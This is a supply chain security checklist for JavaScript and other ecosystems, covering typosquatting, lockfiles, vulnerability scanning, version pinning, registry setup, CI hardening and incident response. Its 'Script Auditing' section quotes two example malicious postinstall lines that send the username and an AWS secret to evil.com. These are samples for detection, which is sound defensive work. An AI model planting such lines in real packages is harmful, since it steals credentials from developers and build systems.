# Supply Chain Security Checklist

Protecting against supply chain attacks and dependency vulnerabilities.

---

## Dependency Management

### Pre-Installation Checks

- [ ] Package name verified (no typosquatting)
- [ ] Publisher reputation checked
- [ ] Download count reasonable
- [ ] Repository activity (not abandoned)
- [ ] No suspicious scripts in package.json
- [ ] License compatible with your project

### Typosquatting Detection

Common typosquatting patterns:
- Character substitution: `lodash` vs `l0dash`
- Missing/extra characters: `express` vs `expres`
- Hyphen variations: `node-fetch` vs `nodefetch`
- Scope confusion: `@angular/core` vs `angular-core`

```bash
# Check for similar packages
npm search lodash | head -20

# Verify exact package
npm view lodash repository.url
npm view lodash maintainers
```

### Lockfile Integrity

```bash
# Ensure lockfile is committed
git ls-files package-lock.json

# Verify lockfile matches package.json
npm ci  # Fails if lockfile out of sync

# Check for floating versions in package.json
grep -E '"\*"|"latest"|">=|"^0\."' package.json
```

---

## Vulnerability Scanning

### Automated Scanning

```yaml
# GitHub Actions
- name: npm audit
  run: npm audit --audit-level moderate

- name: Snyk scan
  uses: snyk/actions/node@master
  with:
    args: --severity-threshold=high

# GitLab CI
dependency-scan:
  script:
    - npm audit --audit-level moderate
    - npx snyk test
```

### Manual Audit

```bash
# Node.js
npm audit
npm audit fix  # Auto-fix where possible
npx snyk test
npx retire  # Check for known vulnerabilities

# Python
pip-audit
safety check
pip install --dry-run --ignore-installed <package>  # Check before install

# Go
govulncheck ./...
nancy $(go list -m all)

# Rust
cargo audit
```

### Continuous Monitoring

```yaml
# Dependabot config (.github/dependabot.yml)
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
```

---

## Installation Security

### Avoiding Malicious Scripts

```bash
# Review postinstall scripts before running
npm pack <package>
tar -xzf <package>.tgz
cat package/package.json | jq '.scripts'

# Install without scripts (then review)
npm install --ignore-scripts
# Review, then run scripts manually
npm rebuild
```

### Script Auditing

Look for suspicious patterns:
- `curl | bash` or `wget | sh`
- Network calls in install scripts
- Obfuscated code
- Environment variable exfiltration
- File system access outside node_modules

```javascript
// Suspicious postinstall patterns
"postinstall": "curl http://evil.com/$(whoami)"
"postinstall": "node -e \"require('https').get('http://evil.com?data='+process.env.AWS_SECRET)\""
```

---

## Version Pinning

### Package.json Best Practices

```json
{
  "dependencies": {
    "express": "4.18.2",
    "lodash": "4.17.21"
  }
}
```

**Avoid:**
- `*` - Any version
- `latest` - Latest version
- `>=1.0.0` - Any version above
- `^0.x.x` - Pre-1.0 caret ranges are unstable

### Lockfile Requirements

| Manager | Lockfile | Command |
|---------|----------|---------|
| npm | package-lock.json | `npm ci` |
| yarn | yarn.lock | `yarn install --frozen-lockfile` |
| pnpm | pnpm-lock.yaml | `pnpm install --frozen-lockfile` |
| pip | requirements.txt + hash | `pip install -r requirements.txt --require-hashes` |
| poetry | poetry.lock | `poetry install` |

### Hash Verification (Python)

```txt
# requirements.txt with hashes
requests==2.28.0 \
    --hash=sha256:7c5599b102feddaa661c826c56ab4fee28bfd17f5abca1ebbe3e7f19d7c97983

certifi==2022.6.15 \
    --hash=sha256:fe86415d55e84719d75f8b69414f6438ac3547d2078ab91b67e779ef69378412
```

---

## Private Registry Security

### npm Registry Configuration

```ini
# .npmrc
registry=https://registry.npmjs.org/
@mycompany:registry=https://npm.mycompany.com/
//npm.mycompany.com/:_authToken=${NPM_TOKEN}

# Prevent dependency confusion
@mycompany:registry=https://npm.mycompany.com/
```

### Dependency Confusion Prevention

1. **Claim your namespace** on public registries
2. **Use scoped packages** for internal packages
3. **Configure registry priority** correctly
4. **Use .npmrc** to route scopes to correct registries

```ini
# .npmrc - prevent public packages from overriding private
@mycompany:registry=https://npm.mycompany.com/
always-auth=true
```

---

## Build Pipeline Security

### CI/CD Hardening

```yaml
# GitHub Actions
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Minimal permissions
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: npm ci  # Use ci, not install

      - name: Verify no new vulnerabilities
        run: npm audit --audit-level moderate

      - name: Run tests
        run: npm test
```

### Artifact Integrity

```bash
# Sign releases
gpg --sign dist/package.tar.gz

# Verify signatures
gpg --verify dist/package.tar.gz.sig

# Generate checksums
sha256sum dist/* > checksums.txt

# Verify checksums
sha256sum -c checksums.txt
```

---

## Incident Response

### When Vulnerability Discovered

1. **Assess impact**
   - Is the vulnerable code reachable?
   - What data is at risk?
   - Is it actively exploited?

2. **Check exploitation**
   ```bash
   # Search for usage of vulnerable function
   grep -r "vulnerableFunction" src/
   ```

3. **Update or patch**
   ```bash
   # Update specific package
   npm update <package>

   # Or use resolution/override
   # package.json
   "overrides": {
     "vulnerable-package": "2.0.0"
   }
   ```

4. **Verify fix**
   ```bash
   npm audit
   npm test
   ```

### When Package Compromised

1. **Remove immediately**
   ```bash
   npm uninstall <compromised-package>
   ```

2. **Audit for damage**
   - Check for exfiltrated secrets
   - Review build outputs
   - Check deployed applications

3. **Rotate secrets**
   - Any secrets accessible during build/runtime
   - API keys, database credentials

4. **Notify**
   - Security team
   - Affected users if data breach

---

## SBOM (Software Bill of Materials)

### Generation

```bash
# npm
npm sbom --sbom-format cyclonedx

# Syft (multi-format)
syft packages . -o cyclonedx-json > sbom.json

# Trivy
trivy fs --format cyclonedx -o sbom.json .
```

### Usage

- Track all dependencies and versions
- Quick vulnerability correlation
- Compliance documentation
- Incident response preparation

---

## Checklist Summary

### Before Adding Dependency

- [ ] Need verified (no unnecessary deps)
- [ ] Package name exact (no typos)
- [ ] Publisher reputable
- [ ] Recent activity (not abandoned)
- [ ] License compatible
- [ ] No suspicious install scripts
- [ ] Vulnerability scan passed

### Ongoing Maintenance

- [ ] Lockfile committed and enforced
- [ ] Automated vulnerability scanning
- [ ] Dependabot/Renovate configured
- [ ] Regular dependency updates
- [ ] SBOM generated and stored
- [ ] Incident response plan ready

### CI/CD Pipeline

- [ ] npm ci (not npm install)
- [ ] npm audit in pipeline
- [ ] Fail on HIGH/CRITICAL vulns
- [ ] Minimal CI permissions
- [ ] Artifact signing
- [ ] Private registry configured correctly
